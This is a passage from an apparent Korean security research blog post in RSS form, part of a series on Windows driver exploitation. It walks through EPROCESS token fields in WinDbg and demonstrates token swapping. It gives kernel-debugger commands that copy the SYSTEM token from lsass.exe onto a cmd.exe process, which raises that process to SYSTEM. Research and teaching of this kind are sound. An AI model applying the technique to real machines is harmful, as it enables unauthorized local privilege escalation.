&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC0DD;&#xC131;&#xB420; &#xB54C; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xD3EC;&#xD568;&#xD574; &#xCEE4;&#xB110; &#xC601;&#xC5ED;&#xC5D0; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xAC01;&#xAC01;&#xC758; EPROCESS&#xB97C; &#xD558;&#xB098;&#xC529; &#xAC16;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. EPROCESS&#xC5D0;&#xB294; &#xAD49;&#xC7A5;&#xD788; &#xB9CE;&#xC740; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xB098; &#xC624;&#xB298; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xC704;&#xD574;&#xC11C;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC2DD;&#xBCC4;&#xACFC; &#xAD8C;&#xD55C; &#xBD80;&#xBD84;&#xB9CC; &#xB2E4;&#xB8E8;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xBA3C;&#xC800; Windbg&#xC5D0;&#xC11C; <code>!process 0 0</code>&#xB85C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA9;&#xB85D;&#xC744; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; !process <span class="hljs-number">0</span> <span class="hljs-number">0</span> **** NT ACTIVE PROCESS DUMP ****PROCESS ffffe405ac497080    SessionId: none  Cid: <span class="hljs-number">0004</span>    Peb: <span class="hljs-number">00000000</span>  ParentCid: <span class="hljs-number">0000</span>    DirBase: <span class="hljs-number">001</span>ad000  ObjectTable: ffff990be8c97e40  HandleCount: <span class="hljs-number">2401.</span>    Image: SystemPROCESS ffffe405ac491080    SessionId: none  Cid: <span class="hljs-number">005</span>c    Peb: <span class="hljs-number">00000000</span>  ParentCid: <span class="hljs-number">0004</span>    DirBase: <span class="hljs-number">00303000</span>  ObjectTable: ffff990be8c7c080  HandleCount:   <span class="hljs-number">0.</span>    Image: Registry...PROCESS ffffe405af71c0c0    SessionId: <span class="hljs-number">0</span>  Cid: <span class="hljs-number">02</span>a8    Peb: eb1cdc9000  ParentCid: <span class="hljs-number">01f</span>4    DirBase: <span class="hljs-number">20b</span>497000  ObjectTable: ffff990bec67be00  HandleCount: <span class="hljs-number">1249.</span>    Image: lsass.exe..</code></pre><p>&#xD604;&#xC7AC; &#xB514;&#xBC84;&#xAE30; &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xB3CC;&#xC544;&#xAC00;&#xB294; &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB9AC;&#xC2A4;&#xD2B8;&#xAC00; &#xB739;&#xB2C8;&#xB2E4;. &#xB108;&#xBB34; &#xB9CE;&#xC73C;&#xB2C8;.. &#xBA87; &#xAC1C; &#xB098;&#xC624;&#xBA74; &#xC911;&#xB2E8;&#xD558;&#xACE0;, <code>lsass.exe</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC608;&#xC2DC;&#xB85C; &#xB4E4;&#xC5B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><blockquote><p>lsass.exe : &#xB85C;&#xCEEC; &#xBCF4;&#xC548; &#xC778;&#xC99D; &#xD558;&#xC704; &#xC2DC;&#xC2A4;&#xD15C; &#xC11C;&#xBE44;&#xC2A4;. &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC744; &#xAC15;&#xD654;&#xB97C; &#xC704;&#xD55C; &#xC708;&#xB3C4;&#xC6B0;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC774;&#xB2E4;. &#xC774;&#xAC83;&#xC740; &#xC708;&#xB3C4;&#xC6B0; &#xCEF4;&#xD4E8;&#xD130;&#xB098; &#xC11C;&#xBC84;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xB294; &#xC720;&#xC800;&#xB4E4;&#xC758; &#xB85C;&#xADF8;&#xC778;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xBA70;, &#xBE44;&#xBC00;&#xBC88;&#xD638; &#xBCC0;&#xACBD;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xACE0;, &#xC561;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC744; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;. &#xB610;&#xD55C; Windows Security Log&#xB97C; &#xC791;&#xC131;&#xD55C;&#xB2E4;.<br>(&#xB531; &#xBD10;&#xB3C4; &#xCEE4;&#xB110; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xB9E4;&#xC6B0; &#xB9E4;&#xC6B0; &#xC911;&#xC694;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC19;&#xC544; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;&#x314E;&#x314E;)</p></blockquote><p><code>lsass.exe</code> &#xC758; EPROCESS&#xB97C; &#xC0B4;&#xD3B4;&#xBCFC; &#xAC74;&#xB370;, EPROCESS &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xB531; &#xC138; &#xAC00;&#xC9C0; &#xD544;&#xB4DC;&#xB9CC; &#xBCF4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C; <code>UniqueProcessId</code>, <code>Token</code>, <code>ImageFileName</code> &#xC785;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; dt nt!_EPROCESS ffffe405af71c0c0 UniqueProcessId Token ImageFilename   +<span class="hljs-number">0x440</span> UniqueProcessId : <span class="hljs-number">0x00000000</span>`<span class="hljs-number">000002</span>a8 Void   +<span class="hljs-number">0x4b8</span> Token           : _EX_FAST_REF   +<span class="hljs-number">0x5a8</span> ImageFileName   : [<span class="hljs-number">15</span>]  <span class="hljs-string">&quot;lsass.exe&quot;</span>* &#xC624;&#xD504;&#xC14B;&#xC740; &#xC708;&#xB3C4;&#xC6B0; &#xBE4C;&#xB4DC; &#xBC84;&#xC804;&#xBCC4; &#xC0C1;&#xC774;</code></pre><p>&#xC6B0;&#xC120;&#xC740; &#xD574;&#xB2F9; &#xD544;&#xB4DC;&#xB4E4;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xAE30;&#xC5B5;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xD558;&#xB098;&#xC529; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;!</p><ul><li><code>UniqueProcessId</code> : &#xD504;&#xB85C;&#xC138;&#xC2A4; ID(PID)</li><li><code>Token</code> : &#xAD8C;&#xD55C; &#xC2DD;&#xBCC4; &#xAC12;</li><li><code>ImageFileName</code> : &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC774;&#xB984;</li></ul><p><code>UniqueProcessId</code>&#xC640; <code>ImageFileName</code>&#xC740; &#xB530;&#xB85C; &#xC124;&#xBA85;&#xC774; &#xD544;&#xC694; &#xC5C6;&#xC744; &#xAC83; &#xAC19;&#xC73C;&#xB2C8;, <code>Token</code>&#xC5D0; &#xB300;&#xD574; &#xC880; &#xB354; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Token-Privilege-identification-value"><a href="#Token-Privilege-identification-value" class="headerlink" title="Token - Privilege identification value"></a>Token - Privilege identification value</h2><p>Windows&#xC5D0;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBCC4;&#xB85C; &#xAD8C;&#xD55C; &#xC2DD;&#xBCC4; &#xAC12;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC911; &#xD558;&#xB098;&#xB97C; Process Token&#xC774;&#xB77C;&#xACE0; &#xD558;&#xBA70;  Token&#xC5D0;&#xB294; &#xD2B9;&#xAD8C; &#xB808;&#xBCA8;&#xC778; Privileges&#xAC00; &#xC874;&#xC7AC;&#xD574; &#xC774;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xAD8C;&#xD55C; &#xC218;&#xC900;&#xC774; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4; </p><p>&#xC704; <code>lsass.exe</code>&#xC758; Token&#xC744; &#xC880; &#xB354; &#xC790;&#xC138;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; dx -id <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,ffffe405ac497080 -r1 (*((ntkrnlmp!_EX_FAST_REF *)<span class="hljs-number">0xffffe405af71c578</span>))(*((ntkrnlmp!_EX_FAST_REF *)<span class="hljs-number">0xffffe405af71c578</span>))                 [Type: _EX_FAST_REF]    [+<span class="hljs-number">0x000</span>] Object           : <span class="hljs-number">0xffff990bec2356bc</span> [Type: <span class="hljs-keyword">void</span> *]    [+<span class="hljs-number">0x000</span> ( <span class="hljs-number">3</span>: <span class="hljs-number">0</span>)] RefCnt           : <span class="hljs-number">0xc</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x000</span>] Value            : <span class="hljs-number">0xffff990bec2356bc</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]</code></pre><p><code>Value</code> &#xD544;&#xB4DC;&#xAC00; &#xBC14;&#xB85C; &#xAD8C;&#xD55C; &#xC2DD;&#xBCC4; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. &#xC5B4;&#xB5A0;&#xD55C; &#xAD8C;&#xD55C;&#xC774; &#xC8FC;&#xC5B4;&#xC9C4; Token Value&#xC778;&#xC9C0;&#xB294; <code>!token [Value &amp; 0xffffffffffffffff0]</code>&#xC640; &#xAC19;&#xC774; &#xD558;&#xC704; 4bit&#xB97C; 0&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; !token <span class="hljs-number">0xffff990bec2356b0</span>_TOKEN <span class="hljs-number">0xffff990bec2356b0</span>TS Session ID: <span class="hljs-number">0</span>User: S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-18</span>User Groups:  <span class="hljs-number">00</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-32</span><span class="hljs-number">-544</span>    Attributes - Default Enabled Owner  <span class="hljs-number">01</span> S<span class="hljs-number">-1</span><span class="hljs-number">-1</span><span class="hljs-number">-0</span>    Attributes - Mandatory Default Enabled  <span class="hljs-number">02</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-11</span>    Attributes - Mandatory Default Enabled  <span class="hljs-number">03</span> S<span class="hljs-number">-1</span><span class="hljs-number">-16</span><span class="hljs-number">-16384</span>    Attributes - GroupIntegrity GroupIntegrityEnabled Primary Group: S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-18</span>Privs:  <span class="hljs-number">02</span> <span class="hljs-number">0x000000002</span> SeCreateTokenPrivilege            Attributes - Enabled  <span class="hljs-number">03</span> <span class="hljs-number">0x000000003</span> SeAssignPrimaryTokenPrivilege     Attributes -  <span class="hljs-number">04</span> <span class="hljs-number">0x000000004</span> SeLockMemoryPrivilege             Attributes - Enabled Default  <span class="hljs-number">05</span> <span class="hljs-number">0x000000005</span> SeIncreaseQuotaPrivilege          Attributes -  <span class="hljs-number">07</span> <span class="hljs-number">0x000000007</span> SeTcbPrivilege                    Attributes - Enabled Default  <span class="hljs-number">08</span> <span class="hljs-number">0x000000008</span> SeSecurityPrivilege               Attributes -  <span class="hljs-number">09</span> <span class="hljs-number">0x000000009</span> SeTakeOwnershipPrivilege          Attributes -  <span class="hljs-number">10</span> <span class="hljs-number">0x00000000a</span> SeLoadDriverPrivilege             Attributes -  <span class="hljs-number">11</span> <span class="hljs-number">0x00000000b</span> SeSystemProfilePrivilege          Attributes - Enabled Default...</code></pre><p>User&#xB97C; &#xBCF4;&#xBA74; <code>S-1-5-18</code> &#xB85C; &#xD45C;&#xC2DC;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; SID(Security Identifier)&#xB77C;&#xACE0; &#xD558;&#xBA70;, &#xAC01; &#xC0AC;&#xC6A9;&#xC790;&#xC758; SID&#xB294; <a href="https://renenyffenegger.ch/notes/Windows/security/SID/index">https://renenyffenegger.ch/notes/Windows/security/SID/index</a> &#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%201.png" alt="windows-driver-part3/Untitled%201.png"></p><p><code>NT AUTHORITY\SYSTEM</code> &#xACC4;&#xC815;&#xC758; &#xAD8C;&#xD55C;&#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB124;&#xC694;!</p><p><img src="/2021/07/28/l0ch/windows-driver-part3/3.png" alt="windows-driver-part3/3.png"></p><p>Process Monitor&#xB85C; &#xD655;&#xC778;&#xD574;&#xB3C4; &#xC5ED;&#xC2DC;&#xB098; &#xAC19;&#xC740; &#xACB0;&#xACFC;&#xB97C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;.</p><h1 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h1><p>Token&#xC774; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xACB0;&#xC815;&#xD558;&#xB294; &#xC694;&#xC18C;&#xB77C;&#xBA74; <code>lsass.exe</code>&#xC640; &#xAC19;&#xC774; &#xCEE4;&#xB110; &#xAD8C;&#xD55C;&#xC744; &#xAC16;&#xB294; <code>NT AUTHORITY\SYSTEM</code> &#xACC4;&#xC815; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; Token&#xC744; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790; &#xAD8C;&#xD55C;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4; Token&#xC5D0; &#xB36E;&#xC5B4;&#xC4F4;&#xB2E4;&#xBA74; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790; &#xAD8C;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xBC14;&#xAFC0; &#xC218; &#xC788;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB97C; Token Swapping&#xC774;&#xB77C;&#xACE0; &#xD558;&#xBA70; Token Swapping&#xC758; &#xB2E8;&#xACC4;&#xB294; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xAC04;&#xB2E8;&#xD788; &#xC815;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;.</p><ol><li>arbitrary read &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xC774;&#xC6A9;&#xD574; SYSTEM &#xAD8C;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC640; &#xC77C;&#xBC18; &#xAD8C;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; EPROCESS &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC544;&#xAE4C; &#xD655;&#xC778;&#xD55C; EPROCESS&#xB85C;&#xBD80;&#xD130; Token &#xC624;&#xD504;&#xC14B;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xAC01;&#xAC01;&#xC758; EPROCESS&#xC758; Token&#xC758; &#xC704;&#xCE58;&#xC640; Value&#xB97C; &#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</li><li>arbitrary write &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB85C; SYSTEM &#xAD8C;&#xD55C;&#xC758; Token Value&#xB97C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD558;&#xAE38; &#xC6D0;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; Token Value&#xC5D0; Overwrite &#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC704; &#xBC29;&#xBC95;&#xC774; &#xC815;&#xB9D0; &#xB418;&#xB294;&#xC9C0; Windbg&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC6B0;&#xC120; &#xB514;&#xBC84;&#xAE30; &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; <code>cmd.exe</code>&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%202.png" alt="windows-driver-part3/Untitled%202.png"></p><blockquote><p>TIP : &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB41C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xC77C;&#xBC18; &#xAD8C;&#xD55C;&#xBCF4;&#xB2E4; &#xBA87; &#xAC00;&#xC9C0;&#xC758; &#xAD8C;&#xD55C;&#xC774; &#xB354; &#xC788;&#xC9C0;&#xB9CC; &#xC720;&#xC800; &#xB808;&#xBCA8;&#xC758; &#xAD8C;&#xD55C;&#xC5D0; &#xC18D;&#xD569;&#xB2C8;&#xB2E4;.<br>&#xADF8;&#xB7EC;&#xB2C8;&#xAE4C;..  &#xB9AC;&#xB205;&#xC2A4; &#xC6F9; &#xC11C;&#xBE44;&#xC2A4;&#xB85C; &#xCE58;&#xBA74; root&#xBCF4;&#xB2E4; &#xB0AE;&#xC740; admin&#xC815;&#xB3C4;?</p></blockquote><p>Windbg&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; Token &#xC704;&#xCE58;&#xB97C; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; !process <span class="hljs-number">0</span> <span class="hljs-number">0</span> cmd.exePROCESS ffffe405b50d1080    SessionId: <span class="hljs-number">1</span>  Cid: <span class="hljs-number">1</span>acc    Peb: <span class="hljs-number">462</span>dd37000  ParentCid: <span class="hljs-number">109</span>c    DirBase: <span class="hljs-number">51</span>d8a000  ObjectTable: ffff990bf4a86940  HandleCount:  <span class="hljs-number">70.</span>    Image: cmd.exe<span class="hljs-number">0</span>: kd&gt; dt nt!_EPROCESS ffffe405b50d1080 UniqueProcessId Token ImageFilename   +<span class="hljs-number">0x440</span> UniqueProcessId : <span class="hljs-number">0x00000000</span>`<span class="hljs-number">00001</span>acc Void   +<span class="hljs-number">0x4b8</span> Token           : _EX_FAST_REF   +<span class="hljs-number">0x5a8</span> ImageFileName   : [<span class="hljs-number">15</span>]  <span class="hljs-string">&quot;cmd.exe&quot;</span><span class="hljs-number">0</span>: kd&gt; dx -id <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,ffffe405ac497080 -r1 (*((ntkrnlmp!_EX_FAST_REF *)<span class="hljs-number">0xffffe405b50d1538</span>))(*((ntkrnlmp!_EX_FAST_REF *)<span class="hljs-number">0xffffe405b50d1538</span>))                 [Type: _EX_FAST_REF]    [+<span class="hljs-number">0x000</span>] Object           : <span class="hljs-number">0xffff990bf7037067</span> [Type: <span class="hljs-keyword">void</span> *]    [+<span class="hljs-number">0x000</span> ( <span class="hljs-number">3</span>: <span class="hljs-number">0</span>)] RefCnt           : <span class="hljs-number">0x7</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x000</span>] Value            : <span class="hljs-number">0xffff990bf7037067</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]</code></pre><p>Token&#xC758; &#xC704;&#xCE58;&#xB294; <code>ffffe405b50d1080 + 4b8 = ffffe405b50d1538</code> &#xC774; &#xB418;&#xACA0;&#xB124;&#xC694;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; dps FFFFE405B50D1538ffffe405`b50d1538  ffff990b`f7037067ffffe405`b50d1540  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>ffffe405`b50d1548  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>ffffe405`b50d1550  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span></code></pre><p>&#xC774;&#xC81C; &#xC774; Token Value&#xB97C; Windbg&#xC758; memory edit&#xAE30;&#xB2A5;&#xC73C;&#xB85C; &#xC544;&#xAE4C; <code>lsass.exe</code>&#xC758; Token Value&#xC778; <code>0xffff990bec2356bc</code>&#xB85C; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; eq FFFFE405B50D1538 <span class="hljs-number">0xffff990bec2356bc</span><span class="hljs-number">0</span>: kd&gt; dps FFFFE405B50D1538ffffe405`b50d1538  ffff990b`ec2356bcffffe405`b50d1540  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>ffffe405`b50d1548  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span></code></pre><p>&#xB2E4;&#xC2DC; &#xB514;&#xBC84;&#xAE30; &#xBA38;&#xC2E0;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xAC00; <code>cmd.exe</code>&#xC758; &#xACC4;&#xC815;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>nt authority\system</code> &#xC73C;&#xB85C; &#xBC14;&#xB010; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%203.png" alt="windows-driver-part3/Untitled%203.png"></p><p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%204.png" alt="windows-driver-part3/Untitled%204.png"></p><p>&#xC77C;&#xBC18; &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC758; <code>cmd.exe</code> &#xC640; &#xBE44;&#xAD50;&#xD588;&#xC744; &#xB54C; &#xD655;&#xC2E4;&#xD788; &#xB9CE;&#xC740; &#xAD8C;&#xD55C;&#xC774; &#xD560;&#xB2F9;&#xB41C; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xADF8;&#xB3D9;&#xC548; &#xBD84;&#xC11D;&#xD55C; <code>AMDRyzenMasterDriver.sys</code> &#xC758; arbitrary read/write &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; EPROCESS&#xB97C; &#xCC3E;&#xACE0; Token&#xC744; Overwrite &#xD558;&#xB294; &#xC775;&#xC2A4;&#xB97C; &#xC791;&#xC131;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC544;&#xB9C8; &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xAC00; &#xC774;&#xBC88; &#xC2DC;&#xB9AC;&#xC988;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xAE00;&#xC774; &#xB420; &#xAC83; &#xAC19;&#xB124;&#xC694;. </p><p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%205.png" alt="windows-driver-part3/Untitled%205.png"></p><blockquote><p>&#xB9C8;&#xC9C0;&#xB9C9; &#xD30C;&#xD2B8;&#xB294; 8/11&#xC77C;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC; &#xB429;&#xB2C8;&#xB2E4;!</p></blockquote>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows-driver/">windows driver</category>
      
      <category domain="https://hackyboiz.github.io/tags/third-party-driver-exploitation/">third-party driver exploitation</category>
      
      <category domain="https://hackyboiz.github.io/tags/amd/">amd</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/28/l0ch/windows-driver-part3/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
